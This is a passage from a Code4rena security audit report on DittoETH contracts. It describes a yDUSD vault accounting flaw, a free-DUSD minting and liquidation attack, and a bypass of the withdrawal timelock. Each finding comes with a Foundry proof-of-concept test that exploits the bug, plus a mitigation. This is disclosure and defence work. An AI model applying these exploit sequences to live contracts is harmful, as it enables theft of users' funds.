*   `@3`: <https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/tokens/yDUSD.sol#L72>
*   `@4`: <https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/tokens/yDUSD.sol#L77>

To calculate the user's shares, the `ERC4626::previewDeposit()` calls the [`ERC4626::_convertToShares()`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4fd2f8be339e850c32206342c3f9a1a7bedbb204/contracts/token/ERC20/extensions/ERC4626.sol#L134) (`@2.1` in the snippet below).

The [calculated shares will be 0 (due to the rounding down)](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4fd2f8be339e850c32206342c3f9a1a7bedbb204/contracts/token/ERC20/extensions/ERC4626.sol#L200) (`@2.2`) because the `ERC20::totalSupply()` will return 0 (the vault's tracked total shares) while the `ERC4626::totalAssets()` will return the previously minted discount amount (i.e., the `newDebt` from `@1`). Refer to the `@2.2` for a detailed explanation of the calculation.

```solidity
        // FILE: node_modules/@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol
        function previewDeposit(uint256 assets) public view virtual override returns (uint256) {
            //@audit @2.1 -- The previewDeposit() calls the _convertToShares() to calculate the shares.
@2.1        return _convertToShares(assets, Math.Rounding.Down);
        }

        // FILE: node_modules/@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol
        function _convertToShares(uint256 assets, Math.Rounding rounding) internal view virtual returns (uint256) {
            //@audit @2.2 -- The calculated shares, in this case, will be 0 (due to the rounding down) 
            //               because the totalSupply() will return 0 (the vault's tracked total shares) 
            //               while the totalAssets() will return the previously minted discount amount 
            //               (i.e., the newDebt from @1).
            //
            //                shares = assets * (0 + 10 ** 0) / newDebt
            //                       = assets * 1 / newDebt (e.g., assets < newDebt)
            //                       = 0 (due to rounding down)
@2.2        return assets.mulDiv(totalSupply() + 10 ** _decimalsOffset(), totalAssets() + 1, rounding);
        }
```

*   `@2.1`: <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4fd2f8be339e850c32206342c3f9a1a7bedbb204/contracts/token/ERC20/extensions/ERC4626.sol#L134>
*   `@2.2`: <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4fd2f8be339e850c32206342c3f9a1a7bedbb204/contracts/token/ERC20/extensions/ERC4626.sol#L200>

As you can see, the `ERC20::totalSupply()` returns the [vault's tracked total shares (0)](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4fd2f8be339e850c32206342c3f9a1a7bedbb204/contracts/token/ERC20/ERC20.sol#L94) (`@2.2.1` in the snippet below), and `ERC4626::totalAssets()` returns the [previously minted discount amount (i.e., the `newDebt` from `@1`)](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4fd2f8be339e850c32206342c3f9a1a7bedbb204/contracts/token/ERC20/extensions/ERC4626.sol#L99) (`@2.2.2`).

```solidity
        // FILE: node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol
        function totalSupply() public view virtual override returns (uint256) {
            //@audit @2.2.1 -- The totalSupply() returns the vault's tracked total shares (0).
@2.2.1      return _totalSupply; //@audit -- tracked shares
        }

        // FILE: node_modules/@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol
        function totalAssets() public view virtual override returns (uint256) {
            //@audit @2.2.2 -- The totalAssets() returns the previously minted discount amount 
            //                 (i.e., the newDebt from @1).
@2.2.2      return _asset.balanceOf(address(this)); //@audit -- spot balance
        }
```

*   `@2.2.1`: <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4fd2f8be339e850c32206342c3f9a1a7bedbb204/contracts/token/ERC20/ERC20.sol#L94>
*   `@2.2.2`: <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4fd2f8be339e850c32206342c3f9a1a7bedbb204/contracts/token/ERC20/extensions/ERC4626.sol#L99>

### Impact

Depositors can lose some deposited `DUSD` assets (principal) or whole assets when the `Ditto` protocol mints `DUSD` debts to the `yDUSD` vault to account for discounts.

### Proof of Concept

This section provides a coded PoC.

Place the `test_PoC_yDUSD_Yault_totalSupply_IncorrectInternalAccounting()` in the `.test/YDUSD.t.sol` file and run the test using the command: `forge test -vv --mt test_PoC_yDUSD_Yault_totalSupply_IncorrectInternalAccounting`.

The PoC shows that a user loses all `DUSD` assets (both principal and yield) when he deposits the assets into the `yDUSD` vault right after the protocol has minted debts to the vault.

```solidity
function test_PoC_yDUSD_Yault_totalSupply_IncorrectInternalAccounting() public {
    // Create discounts to generate newDebt
    uint88 newDebt = uint88(discountSetUp());
    assertEq(rebasingToken.totalAssets(), newDebt);
    assertEq(rebasingToken.totalSupply(), 0);
    assertEq(rebasingToken.balanceOf(receiver), 0);
    assertEq(rebasingToken.balanceOf(_diamond), 0);
    assertEq(rebasingToken.balanceOf(_yDUSD), 0);
    assertEq(token.balanceOf(_yDUSD), newDebt);

    // Receiver deposits DUSD into the vault to get yDUSD
    vm.prank(receiver);
    rebasingToken.deposit(DEFAULT_AMOUNT, receiver);

    assertEq(rebasingToken.totalAssets(), DEFAULT_AMOUNT + newDebt);
    assertEq(rebasingToken.totalSupply(), 0);       // 0 amount due to the invalid accounting bug of totalSupply
    assertEq(rebasingToken.balanceOf(receiver), 0); // 0 amount due to the invalid accounting bug of totalSupply
    assertEq(rebasingToken.balanceOf(_diamond), 0);
    assertEq(rebasingToken.balanceOf(_yDUSD), 0);
    assertEq(token.balanceOf(_yDUSD), DEFAULT_AMOUNT + newDebt);

    // Match at oracle
    fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, extra);
    fundLimitAskOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, extra);

    skip(C.DISCOUNT_WAIT_TIME);

    // Receiver expects to withdraw yDUSD and get back more DUSD than the original amount (Expect Revert!!!)
    // @dev Roughly DEFAULT_AMOUNT + newDebt, but rounded down
    uint88 withdrawAmountReceiver = 54999999999999999999990;
    vm.prank(receiver);
    vm.expectRevert(Errors.ERC4626WithdrawMoreThanMax.selector); // Expect Revert!!!
    rebasingToken.proposeWithdraw(withdrawAmountReceiver);

    // 0 amount due to the invalid accounting bug of totalSupply
    assertEq(rebasingToken.maxWithdraw(receiver), 0);
}
```

### Recommended Mitigation Steps

Rework the `yDUSD` vault by applying the concept of a single-sided auto-compounding token rewards mechanism of the [xERC4626](https://github.com/ERC4626-Alliance/ERC4626-Contracts/blob/main/src/xERC4626.sol), which is fully compatible with the `ERC4626` and ultimately maintains balances using internal accounting to prevent instantaneous changes in the exchange rate.

**[@ditto-eth (sponsor) acknowledged](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/7#issuecomment-2234443670)**

*Note: see [original submission](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/7) for full discussion.*


***

## [[H-04] An attacker can mint free DUSD and liquidate the corresponding Short Record to earn liquidation rewards](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/2)
*Submitted by [nonseodion](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/2)*

### Summary

An attacker can use `decreaseCollateral()` function to reduce the collateral of a Short Recordn (SR) and `cancelOrder()` to cancel the corresponding Short Order having a collateral ratio < 1. The Short Record ends up having less collateral than debt and is now liquidatable.

### Description

A user can create a Short Order with a collateral ratio (CR) of less than 1. The protocol ensures that at least `minShortErc` in the Short Orders Short Record has enough collateral by filling the Short Record with collateral to cover `minShortErc` before the Short Order is matched or placed on the order book.

In addition, during the match the bid also provides equivalent collateral to the `ercDebt` it creates. So if the Short Order CR is 0.7 it ends up being 1.7 CR after matching.

By utilising the `cancelShort()` and `decreaseCollateral()` functions on a short Order with CR < 1, an attacker can create free DUSD and make the Short Record liquidatable.

The [cancelShort()](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L923-L995) function lets the caller cancel a Short Order. If the `ercDebt` is smaller than `minShortErc` as shown in line 953 below, it mints the difference to the shorter (i.e the address that created the Short Order) in line 982. The amount of collateral needed is calculated in line 960 and uses `cr`. `cr` is the collateral ratio and if it is less than 1 then the protocol would be minting DUSD with lesser collateral. But since it has already ensured that `minShortErc` has enough collateral in the Short Record before the Short Order was created, this shouldn't be a problem.

**[LibOrders.sol#L946-L976](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L946-L976)**

```solidity
953:             if (shortRecord.ercDebt < minShortErc) {
954:                 // @dev prevents leaving behind a partially filled SR under minShortErc
955:                 // @dev if the corresponding short is cancelled, then the partially filled SR's debt will == minShortErc
956:                 uint88 debtDiff = uint88(minShortErc - shortRecord.ercDebt); // @dev(safe-cast)
957:                 {
958:                     STypes.Vault storage Vault = s.vault[vault];
959:                     // @audit-issue the collateral could be bad if price moved.
960:                     uint88 collateralDiff = shortOrder.price.mulU88(debtDiff).mulU88(cr);
961: 
962:                     LibShortRecord.fillShortRecord(
963:                         asset,
964:                         shorter,
965:                         shortRecordId,
966:                         SR.FullyFilled,
967:                         collateralDiff,
968:                         debtDiff,
969:                         Asset.ercDebtRate,
970:                         Vault.dethYieldRate,
971:                         0
972:                     );
973: 
974:                     Vault.dethCollateral += collateralDiff;
975:                     Asset.dethCollateral += collateralDiff;
976:                     Asset.ercDebt += debtDiff;
977: 
978:                     // @dev update the eth refund amount
979:                     eth -= collateralDiff;
980:                 }
981:                 // @dev virtually mint the increased debt
982:                 s.assetUser[asset][shorter].ercEscrowed += debtDiff;
983:             } else {

```

The [decreaseCollateral()](ShortRecordFacet.sol#L83-L107) function lets the caller reduce the collateral he has in the Short Record.

An attacker can use `decreaseCollateral()` to reduce the collateral of the Short Record before cancelling. Thus, removing the collateral added for `minShortErc` and the protocol ends up minting DUSD with less Ethereum collateral.

The attacker earns the DUSD minted while providing less collateral value. The Short Record will become liquidatable and the attacker can further liquidate it to earn liquidation rewards.

### Impact

The protocol mints DUSD for free and pays liquidation rewards when the bad debt position is liquidated.

### Proof of Concept

To execute the POC the Short Record has to have debt so that `decreaseCollateral()` and `cancelShort()` can be called on it successfully. To do this, the POC creates two Short Orders, a normal Short Order and the other with CR < 1. It then uses a bid order to fill the normal Short Order and a tiny amount of the order with CR < 1.

The test can be run in the `Shorts.t.sol` file.

```solidity
    // Add the import below
    // import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";

    function test_StealDUSD() public {
        // set default Collateral Ratios
        vm.startPrank(owner);
        diamond.setInitialCR(asset, 170);
        diamond.setLiquidationCR(asset, 150);
        vm.stopPrank();

        initialCR = 170;
        uint80 price = DEFAULT_PRICE;
        uint88 amount = DEFAULT_AMOUNT;
        uint88 minShortErc = 2000 ether;

        // add a normal short order to fill the bid
        fundLimitShortOpt(price, amount, sender);
        // sender has 0 ethEscrowed
        assertEq(diamond.getVaultUserStruct(vault, sender).ethEscrowed, 0);
        depositEth(sender, price.mulU88(minShortErc).mulU88(1.7e18));
        uint initialEth = diamond.getVaultUserStruct(vault, sender).ethEscrowed;
        
        // creates a Short Order with CR = 0.7
        uint16[] memory shortHintArray = setShortHintArray();
        MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
        vm.prank(sender);
        diamond.createLimitShort(asset, price, minShortErc, orderHintArray, shortHintArray, 70);        

        // creates a Bid which completely fills the first Short Order and only fills 
        // 100000 wei in the second WEI
        fundLimitBidOpt(price, amount +  100000, receiver);

        assertEq(diamond.getAssetUserStruct(asset, sender).ercEscrowed, 0);
        vm.startPrank(sender);
        // decreases collateral by 499999999999999958, the collateral added to cover minShortErc is
        // 500000000000000000, but we can't remove everything because the protocol requires us to cover
        // the tiny debt we created
        decreaseCollateral(3, 499999999999999958); 
        cancelShort(101);
        
        uint finalEth = diamond.getVaultUserStruct(vault, sender).ethEscrowed;
        uint ercEscrowed = diamond.getAssetUserStruct(asset, sender).ercEscrowed;
        // profit ~= 0.15 ether ( price.mulU88(ercEscrowed) - initialEth-finalEth )
        assertGt(price.mulU88(ercEscrowed), initialEth-finalEth); 
        // the attacker can also decide to liquidate the position and earn more rewards
        assertLt(diamond.getCollateralRatio(asset, getShortRecord(sender, 3)), 150e18);
    }
```

### Recommended Mitigation Steps

Consider adding a check to `cancelOrder()` to ensure the resulting SR Collateral Ratio is not below the redemption and liquidation collateral ratios.

```solidity
        if (cRatio < LibOrders.max(LibAsset.liquidationCR(asset), C.MAX_REDEMPTION_CR)) {
            revert Errors.ShortBelowCRThreshold();
        }
```

**[ditto-eth (sponsor) confirmed and commented](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/2#issuecomment-2231816425):**
 > Good find, will fix this issue in `decreaseCollateral()` instead of `cancelShort()`.


***

 
# Medium Risk Findings (1)
## [[M-01] Users can evade the `yDUSD` vault's withdrawal timelock mechanism](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/9)
*Submitted by [serial-coder](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/9)*

### Summary

The `yDUSD` vault's withdrawal timelock mechanism is vulnerable. An exploiter can withdraw the `DUSD` assets in their account by using another account's `proposedWithdraw` request info, breaking the vault's core invariant.

### Description

Assuming Bob is an exploiter, he can evade his account (i.e., `owner`) from the `yDUSD` vault's withdrawal timelock mechanism by using [the `proposeWithdraw` request info of another account (i.e., `msg.sender`)](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/tokens/yDUSD.sol#L85) (`@1` in the snippet below), which can be requested beforehand.

This way, he can withdraw his `DUSD` assets in the `owner` account from the vault without waiting for the 7-day period, breaking the invariant of the vault's timelock mechanism.

With the `msg.sender`'s `proposeWithdraw`request info, the [7-day timelock period check](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/tokens/yDUSD.sol#L91) (`@2`) can be passed. After passing the withdrawal timelock check in `@2`, the [`DUSD` assets in the `owner` account](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/tokens/yDUSD.sol#L107) (`@3`) can be withdrawn without invoking the `yDUSD::proposeWithdraw()`.

```solidity
    function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256) {
        //@audit @1 -- Bob can evade his account (i.e., owner) from the vault's withdrawal timelock mechanism by using
        //             the proposeWithdraw info of another account (i.e., msg.sender), which can be requested beforehand.
        //
        //             This way, he can withdraw his DUSD assets in the 'owner' account from the vault without 
        //             waiting for the 7-day period, breaking the invariant of the vault's timelock mechanism.
@1      WithdrawStruct storage withdrawal = withdrawals[msg.sender];
        uint256 amountProposed = withdrawal.amountProposed;
        uint256 timeProposed = withdrawal.timeProposed;

        if (timeProposed == 0 && amountProposed <= 1) revert Errors.ERC4626ProposeWithdrawFirst();

        //@audit @2 -- With the msg.sender's proposeWithdraw request info, the 7-day timelock period check can be passed.
@2      if (timeProposed + C.WITHDRAW_WAIT_TIME > uint40(block.timestamp)) revert Errors.ERC4626WaitLongerBeforeWithdrawing();

        // @dev After 7 days from proposing, a user has 45 days to withdraw
        // @dev User will need to cancelWithdrawProposal() and proposeWithdraw() again
        if (timeProposed + C.WITHDRAW_WAIT_TIME + C.MAX_WITHDRAW_TIME <= uint40(block.timestamp)) {
            revert Errors.ERC4626MaxWithdrawTimeHasElapsed();
        }

        if (amountProposed > maxWithdraw(owner)) revert Errors.ERC4626WithdrawMoreThanMax();

        checkDiscountWindow();

        uint256 shares = previewWithdraw(amountProposed);

        IAsset _dusd = IAsset(dusd);
        uint256 oldBalance = _dusd.balanceOf(receiver);
        //@audit @3 -- After passing the timelock check in @2, the DUSD assets in Bob's owner account can be withdrawn 
        //             without invoking the proposeWithdraw().
@3      _withdraw(_msgSender(), receiver, owner, amountProposed, shares);
        uint256 newBalance = _dusd.balanceOf(receiver);

        // @dev Slippage is likely irrelevant for this. Merely for preventative purposes
        uint256 slippage = 0.01 ether;
        if (newBalance < slippage.mul(amountProposed) + oldBalance) revert Errors.ERC4626WithdrawSlippageExceeded();

        delete withdrawal.timeProposed;
        //reset withdrawal (1 to keep slot warm)
        withdrawal.amountProposed = 1;

        return shares;
    }
```

*   `@1`: <https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/tokens/yDUSD.sol#L85>
*   `@2`: <https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/tokens/yDUSD.sol#L91>
*   `@3`: <https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/tokens/yDUSD.sol#L107>

To exploit the vulnerability, Bob must approve [the shares transfer of the `owner` account](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4fd2f8be339e850c32206342c3f9a1a7bedbb204/contracts/token/ERC20/extensions/ERC4626.sol#L237-L239) (`@3.1` in the snippet below) for the `withdrawer` account (i.e., `msg.sender`).

After `@3.1`, the `ERC4626::_withdraw()` will burn the [shares from the `owner` account](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4fd2f8be339e850c32206342c3f9a1a7bedbb204/contracts/token/ERC20/extensions/ERC4626.sol#L247) (`@3.2`), and then the [`DUSD` assets in the `owner` account](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4fd2f8be339e850c32206342c3f9a1a7bedbb204/contracts/token/ERC20/extensions/ERC4626.sol#L248) (`@3.3`) will eventually be transferred out.

```solidity
        // FILE: node_modules/@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol
        function _withdraw(
            address caller,
            address receiver,
            address owner,
            uint256 assets,
            uint256 shares
        ) internal virtual {
            //@audit @3.1 -- To exploit the vulnerability, Bob must approve the shares transfer of the 'owner' account 
            //               for the withdrawer account (i.e., msg.sender).
@3.1        if (caller != owner) {
@3.1            _spendAllowance(owner, caller, shares);
@3.1        }

            // If _asset is ERC777, `transfer` can trigger a reentrancy AFTER the transfer happens through the
            // `tokensReceived` hook. On the other hand, the `tokensToSend` hook, that is triggered before the transfer,
            // calls the vault, which is assumed not malicious.
            //
            // Conclusion: we need to do the transfer after the burn so that any reentrancy would happen after the
            // shares are burned and after the assets are transferred, which is a valid state.

            //@audit @3.2 -- The _withdraw() will burn the shares from the 'owner' account.
@3.2        _burn(owner, shares);

            //@audit @3.3 -- Then, the DUSD assets in the 'owner' account will eventually be transferred out.
@3.3        SafeERC20.safeTransfer(_asset, receiver, assets);

            emit Withdraw(caller, receiver, owner, assets, shares);
        }
```

*   `@3.1`: <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4fd2f8be339e850c32206342c3f9a1a7bedbb204/contracts/token/ERC20/extensions/ERC4626.sol#L237-L239>
*   `@3.2`: <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4fd2f8be339e850c32206342c3f9a1a7bedbb204/contracts/token/ERC20/extensions/ERC4626.sol#L247>
*   `@3.3`: <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4fd2f8be339e850c32206342c3f9a1a7bedbb204/contracts/token/ERC20/extensions/ERC4626.sol#L248>

### Impact

Users can withdraw their `DUSD` assets from the `yDUSD` vault without waiting for the 7-day period, breaking the vault's timelock mechanism's invariant.

### Proof of Concept

This section provides a coded PoC.

Place the `test_PoC_yDUSD_Vault_BreakingWithdrawalInvariant()` in the `.test/YDUSD.t.sol` file and declare the following `import` directive at the top of the test file: `import {IyDUSD} from "interfaces/IyDUSD.sol";`.

To run the test, execute the command: `forge test -vv --mt test_PoC_yDUSD_Vault_BreakingWithdrawalInvariant`.

The PoC shows that an exploiter can withdraw their `DUSD` assets in the `sender` account using another withdrawer account, i.e., the `receiver` account, without waiting for the 7-day period.

```solidity
function test_PoC_yDUSD_Vault_BreakingWithdrawalInvariant() public {
    // Require: import {IyDUSD} from "interfaces/IyDUSD.sol";

    // ----- Setup PoC -----
    // Mint dusd to sender
    vm.prank(_diamond);
    token.mint(sender, DEFAULT_AMOUNT);

    // Match at oracle
    fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, extra);
    fundLimitAskOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, extra);

    skip(C.DISCOUNT_WAIT_TIME);
    // ----- Setup PoC -----

    // Receiver deposits DUSD into the vault to get yDUSD
    vm.prank(receiver);
    rebasingToken.deposit(DEFAULT_AMOUNT, receiver);

    // Receiver proposes for withdrawal
    vm.prank(receiver);
    rebasingToken.proposeWithdraw(DEFAULT_AMOUNT);

    // Skip 7 days to avoid the ERC4626WaitLongerBeforeWithdrawing error
    skip(7 days);

    // Sender deposits DUSD into the vault to get yDUSD
    vm.prank(sender);
    rebasingToken.deposit(DEFAULT_AMOUNT, sender);

    // To exploit the vulnerability, perform the following steps:
    //
    // 1. Sender approves shares transfer for Receiver (another Sybil account)
    vm.prank(sender);
    IyDUSD(_yDUSD).approve(receiver, type(uint256).max); // Require: import {IyDUSD} from "interfaces/IyDUSD.sol";

    // 2. Sender withdraws DUSD assets from his account using Receiver's proposed info
    //
    // As a result, Sender neither needs to execute the proposeWithdraw() nor wait for any second to withdraw his assets
    vm.prank(receiver);
    rebasingToken.withdraw(0 /* unused */, sender /* receiver */, sender /* owner */); // Use Receiver's proposed info
}
```

### Recommended Mitigation Steps

Add a check for the `msg.sender` and the inputted `owner`, and revert a transaction if they are not matched.

```diff
    function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256) {
+       if (msg.sender != owner) revert Errors.ERC4626InvalidOwner();

        WithdrawStruct storage withdrawal = withdrawals[msg.sender];
        uint256 amountProposed = withdrawal.amountProposed;
        uint256 timeProposed = withdrawal.timeProposed;

        if (timeProposed == 0 && amountProposed <= 1) revert Errors.ERC4626ProposeWithdrawFirst();

        if (timeProposed + C.WITHDRAW_WAIT_TIME > uint40(block.timestamp)) revert Errors.ERC4626WaitLongerBeforeWithdrawing();

        // @dev After 7 days from proposing, a user has 45 days to withdraw
        // @dev User will need to cancelWithdrawProposal() and proposeWithdraw() again
        if (timeProposed + C.WITHDRAW_WAIT_TIME + C.MAX_WITHDRAW_TIME <= uint40(block.timestamp)) {
            revert Errors.ERC4626MaxWithdrawTimeHasElapsed();
        }

        if (amountProposed > maxWithdraw(owner)) revert Errors.ERC4626WithdrawMoreThanMax();

        checkDiscountWindow();

        uint256 shares = previewWithdraw(amountProposed);

        IAsset _dusd = IAsset(dusd);
        uint256 oldBalance = _dusd.balanceOf(receiver);
        _withdraw(_msgSender(), receiver, owner, amountProposed, shares);
        uint256 newBalance = _dusd.balanceOf(receiver);

        // @dev Slippage is likely irrelevant for this. Merely for preventative purposes
        uint256 slippage = 0.01 ether;
        if (newBalance < slippage.mul(amountProposed) + oldBalance) revert Errors.ERC4626WithdrawSlippageExceeded();

        delete withdrawal.timeProposed;
        //reset withdrawal (1 to keep slot warm)
        withdrawal.amountProposed = 1;

        return shares;
    }
```

**[ditto-eth (sponsor) confirmed](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/9#event-13527281243)**

**[hansfriese (judge) commented](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/9#issuecomment-2236891399):**
 > Nice finding!<br>
> Medium is appropriate as the withdrawal timelock can be bypassed.


***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
